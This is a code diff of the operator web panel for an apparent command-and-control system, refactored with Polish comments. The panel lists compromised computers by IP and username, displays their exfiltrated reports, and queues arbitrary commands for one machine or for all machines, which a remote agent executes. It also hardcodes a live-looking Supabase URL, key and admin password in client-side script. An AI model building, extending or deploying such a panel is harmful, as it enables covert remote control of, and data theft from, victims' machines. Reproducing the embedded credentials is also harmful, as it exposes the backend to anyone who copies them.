@@ -7,19 +7,20 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #0a0a0a; color: #fff; font-family: monospace; padding: 20px; }
         .container { max-width: 1400px; margin: 0 auto; }
-        h1 { color: #00ff00; }
-        .login-box { max-width: 400px; margin: 100px auto; background: #1a1a1a; padding: 30px; border-radius: 10px; }
-        input, button { padding: 10px; margin: 10px 0; width: 100%; background: #333; color: #fff; border: none; }
-        button { background: #00ff00; color: #000; cursor: pointer; }
+        h1 { color: #00ff00; margin-bottom: 20px; }
+        .login-box { max-width: 400px; margin: 100px auto; background: #1a1a1a; padding: 30px; border-radius: 10px; text-align: center; }
+        .login-box input { width: 100%; padding: 10px; margin: 10px 0; background: #333; color: #fff; border: none; }
+        .login-box button { width: 100%; padding: 10px; background: #00ff00; color: #000; border: none; cursor: pointer; font-weight: bold; }
+        .login-box button:hover { background: #00cc00; }
         .computers-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; margin-top: 20px; }
         .computer-card { background: #1a1a1a; border-radius: 10px; padding: 15px; border-left: 4px solid #00ff00; cursor: pointer; }
         .computer-card.offline { border-left-color: #ff0000; opacity: 0.6; }
         .computer-name { font-size: 18px; font-weight: bold; }
         .computer-ip { color: #888; font-size: 12px; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; }
         .modal-content { background: #1a1a1a; margin: 5% auto; padding: 20px; width: 80%; max-width: 800px; border-radius: 10px; }
         .close { float: right; cursor: pointer; font-size: 28px; color: #ff0000; }
-        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
+        .tabs { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
         .tab { padding: 8px 16px; background: #333; cursor: pointer; border-radius: 5px; }
         .tab.active { background: #00ff00; color: #000; }
         pre { background: #000; padding: 10px; overflow-x: auto; font-size: 12px; }
@@ -31,15 +32,15 @@
     <div id="loginSection" class="login-box">
         <h2>C2 ADMIN LOGIN</h2>
         <input type="password" id="passwordInput" placeholder="Admin password">
-        <button onclick="login()">Login</button>
+        <button id="loginBtn">Login</button>
     </div>
     
     <div id="mainSection" style="display:none;">
         <h1>C2 COMMAND AND CONTROL</h1>
         <div class="tabs">
-            <div class="tab active" onclick="showTab('computers')">COMPUTERS</div>
-            <div class="tab" onclick="showTab('reports')">REPORTS</div>
-            <div class="tab" onclick="showTab('commands')">COMMANDS</div>
+            <div class="tab active" data-tab="computers">COMPUTERS</div>
+            <div class="tab" data-tab="reports">REPORTS</div>
+            <div class="tab" data-tab="commands">COMMANDS</div>
         </div>
         
         <div id="computersTab">
@@ -52,7 +53,7 @@
         
         <div id="commandsTab" style="display:none;">
             <textarea id="commandInput" rows="3" placeholder="Enter command for ALL computers..."></textarea>
-            <button onclick="sendCommandToAll()">SEND TO ALL</button>
+            <button id="sendAllBtn">SEND TO ALL</button>
             <pre id="commandResults">No commands</pre>
         </div>
     </div>
@@ -66,125 +67,150 @@
 </div>
 
 <script>
-    const SUPABASE_URL = "https://suipfydwvakzyxodycqm.supabase.co";
-    const SUPABASE_KEY = "sb_publishable_tzVu8Ml-hUbxjLxdEkJPJg_CX3f609n";
-    const ADMIN_PASSWORD = "08319752026";
-    
-    let supabase = null;
-    let currentComputerId = null;
-    
-    async function login() {
-        const pwd = document.getElementById('passwordInput').value;
-        if (pwd === ADMIN_PASSWORD) {
-            document.getElementById('loginSection').style.display = 'none';
-            document.getElementById('mainSection').style.display = 'block';
-            supabase = supabaseJs.createClient(SUPABASE_URL, SUPABASE_KEY);
-            loadComputers();
-            loadReports();
-            loadCommands();
-            setInterval(loadComputers, 30000);
-            setInterval(loadReports, 60000);
-        } else {
-            alert('Wrong password!');
-        }
-    }
-    
-    async function loadComputers() {
-        if (!supabase) return;
-        const { data, error } = await supabase.from('computers').select('*').order('last_seen', {ascending: false});
-        if (error) return;
+    (function() {
+        const SUPABASE_URL = "https://suipfydwvakzyxodycqm.supabase.co";
+        const SUPABASE_KEY = "sb_publishable_tzVu8Ml-hUbxjLxdEkJPJg_CX3f609n";
+        const ADMIN_PASSWORD = "08319752026";
         
-        const container = document.getElementById('computersList');
-        container.innerHTML = '';
+        let supabaseClient = null;
+        let currentComputerId = null;
         
-        data.forEach(comp => {
-            const lastSeen = new Date(comp.last_seen);
-            const isOnline = (Date.now() - lastSeen) < 300000;
+        // Funkcje pomocnicze
+        function showTab(tabName) {
+            document.getElementById('computersTab').style.display = tabName === 'computers' ? 'block' : 'none';
+            document.getElementById('reportsTab').style.display = tabName === 'reports' ? 'block' : 'none';
+            document.getElementById('commandsTab').style.display = tabName === 'commands' ? 'block' : 'none';
             
-            const card = document.createElement('div');
-            card.className = `computer-card ${isOnline ? 'online' : 'offline'}`;
-            card.onclick = () => showComputerDetails(comp);
-            card.innerHTML = `
-                <div class="computer-name">${isOnline ? '●' : '○'} ${comp.name}</div>
-                <div class="computer-ip">IP: ${comp.ip || 'N/A'} | User: ${comp.username}</div>
-                <div class="computer-ip">Last: ${lastSeen.toLocaleString()}</div>
-            `;
-            container.appendChild(card);
-        });
-    }
-    
-    async function showComputerDetails(computer) {
-        currentComputerId = computer.id;
-        const modal = document.getElementById('computerModal');
-        const content = document.getElementById('modalContent');
-        
-        const { data: reports } = await supabase.from('reports').select('*').eq('computer_id', computer.id).order('created_at', {ascending: false}).limit(10);
-        
-        content.innerHTML = `
-            <h2>${computer.name}</h2>
-            <p>IP: ${computer.ip} | User: ${computer.username}</p>
-            <h3>Recent Reports</h3>
-            <pre>${JSON.stringify(reports, null, 2)}</pre>
-            <h3>Send Command</h3>
-            <textarea id="cmdInput" rows="3" style="width:100%"></textarea>
-            <button onclick="sendCommandToPC()">Send</button>
-            <div id="cmdResult"></div>
-        `;
-        modal.style.display = 'block';
-    }
-    
-    async function sendCommandToPC() {
-        const cmd = document.getElementById('cmdInput').value;
-        if (!cmd) return;
-        const { error } = await supabase.from('commands').insert({
-            computer_id: currentComputerId,
-            command: cmd,
-            status: 'pending'
-        });
-        const resultDiv = document.getElementById('cmdResult');
-        if (error) {
-            resultDiv.innerHTML = 'Error: ' + error.message;
-        } else {
-            resultDiv.innerHTML = 'Command sent! Agent will execute it.';
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.toggle('active', tab.dataset.tab === tabName);
+            });
+            
+            if (tabName === 'reports') loadReports();
+            if (tabName === 'commands') loadCommands();
         }
-    }
-    
-    async function sendCommandToAll() {
-        const cmd = document.getElementById('commandInput').value;
-        if (!cmd) return;
-        const { data: computers } = await supabase.from('computers').select('id');
-        for (const comp of computers) {
-            await supabase.from('commands').insert({
-                computer_id: comp.id,
-                command: cmd,
-                status: 'pending'
+        
+        async function loadComputers() {
+            if (!supabaseClient) return;
+            const { data, error } = await supabaseClient.from('computers').select('*').order('last_seen', {ascending: false});
+            if (error) return;
+            
+            const container = document.getElementById('computersList');
+            container.innerHTML = '';
+            
+            if (!data || data.length === 0) {
+                container.innerHTML = '<div style="padding:20px; text-align:center;">No computers yet. Agent not started.</div>';
+                return;
+            }
+            
+            data.forEach(comp => {
+                const lastSeen = new Date(comp.last_seen);
+                const isOnline = (Date.now() - lastSeen) < 300000;
+                
+                const card = document.createElement('div');
+                card.className = `computer-card ${isOnline ? 'online' : 'offline'}`;
+                card.onclick = () => showComputerDetails(comp);
+                card.innerHTML = `
+                    <div class="computer-name">${isOnline ? '●' : '○'} ${comp.name}</div>
+                    <div class="computer-ip">IP: ${comp.ip || 'N/A'} | User: ${comp.username || 'N/A'}</div>
+                    <div class="computer-ip">Last: ${lastSeen.toLocaleString()}</div>
+                `;
+                container.appendChild(card);
             });
         }
-        alert(`Command sent to ${computers.length} computers`);
-        loadCommands();
-    }
-    
-    async function loadReports() {
-        if (!supabase) return;
-        const { data } = await supabase.from('reports').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
-        document.getElementById('reportsContent').innerHTML = data ? JSON.stringify(data, null, 2) : 'No reports';
-    }
-    
-    async function loadCommands() {
-        if (!supabase) return;
-        const { data } = await supabase.from('commands').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
-        document.getElementById('commandResults').innerHTML = data ? JSON.stringify(data, null, 2) : 'No commands';
-    }
-    
-    function showTab(tab) {
-        document.getElementById('computersTab').style.display = tab === 'computers' ? 'block' : 'none';
-        document.getElementById('reportsTab').style.display = tab === 'reports' ? 'block' : 'none';
-        document.getElementById('commandsTab').style.display = tab === 'commands' ? 'block' : 'none';
-    }
-    
-    function closeModal() {
-        document.getElementById('computerModal').style.display = 'none';
-    }
+        
+        async function showComputerDetails(computer) {
+            currentComputerId = computer.id;
+            const modal = document.getElementById('computerModal');
+            const content = document.getElementById('modalContent');
+            
+            const { data: reports } = await supabaseClient.from('reports').select('*').eq('computer_id', computer.id).order('created_at', {ascending: false}).limit(10);
+            
+            content.innerHTML = `
+                <h2>${computer.name}</h2>
+                <p>IP: ${computer.ip} | User: ${computer.username}</p>
+                <h3>Recent Reports</h3>
+                <pre>${JSON.stringify(reports, null, 2)}</pre>
+                <h3>Send Command</h3>
+                <textarea id="cmdInput" rows="3" style="width:100%"></textarea>
+                <button id="sendCmdBtn">Send</button>
+                <div id="cmdResult"></div>
+            `;
+            
+            document.getElementById('sendCmdBtn').onclick = async function() {
+                const cmd = document.getElementById('cmdInput').value;
+                if (!cmd) return;
+                const { error } = await supabaseClient.from('commands').insert({
+                    computer_id: currentComputerId,
+                    command: cmd,
+                    status: 'pending'
+                });
+                const resultDiv = document.getElementById('cmdResult');
+                if (error) {
+                    resultDiv.innerHTML = 'Error: ' + error.message;
+                } else {
+                    resultDiv.innerHTML = 'Command sent! Agent will execute it.';
+                }
+            };
+            
+            modal.style.display = 'block';
+        }
+        
+        async function sendCommandToAll() {
+            const cmd = document.getElementById('commandInput').value;
+            if (!cmd) return;
+            const { data: computers } = await supabaseClient.from('computers').select('id');
+            for (const comp of computers) {
+                await supabaseClient.from('commands').insert({
+                    computer_id: comp.id,
+                    command: cmd,
+                    status: 'pending'
+                });
+            }
+            alert(`Command sent to ${computers.length} computers`);
+            loadCommands();
+        }
+        
+        async function loadReports() {
+            if (!supabaseClient) return;
+            const { data } = await supabaseClient.from('reports').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
+            document.getElementById('reportsContent').innerHTML = data ? JSON.stringify(data, null, 2) : 'No reports';
+        }
+        
+        async function loadCommands() {
+            if (!supabaseClient) return;
+            const { data } = await supabaseClient.from('commands').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
+            document.getElementById('commandResults').innerHTML = data ? JSON.stringify(data, null, 2) : 'No commands';
+        }
+        
+        function closeModal() {
+            document.getElementById('computerModal').style.display = 'none';
+        }
+        
+        // Inicjalizacja
+        document.getElementById('loginBtn').onclick = async function() {
+            const pwd = document.getElementById('passwordInput').value;
+            if (pwd === ADMIN_PASSWORD) {
+                document.getElementById('loginSection').style.display = 'none';
+                document.getElementById('mainSection').style.display = 'block';
+                supabaseClient = supabaseJs.createClient(SUPABASE_URL, SUPABASE_KEY);
+                await loadComputers();
+                loadReports();
+                loadCommands();
+                setInterval(loadComputers, 30000);
+                setInterval(loadReports, 60000);
+            } else {
+                alert('Wrong password!');
+            }
+        };
+        
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.onclick = () => showTab(tab.dataset.tab);
+        });
+        
+        document.getElementById('sendAllBtn').onclick = sendCommandToAll;
+        
+        window.closeModal = closeModal;
+    })();
 </script>
 </body>
 </html>
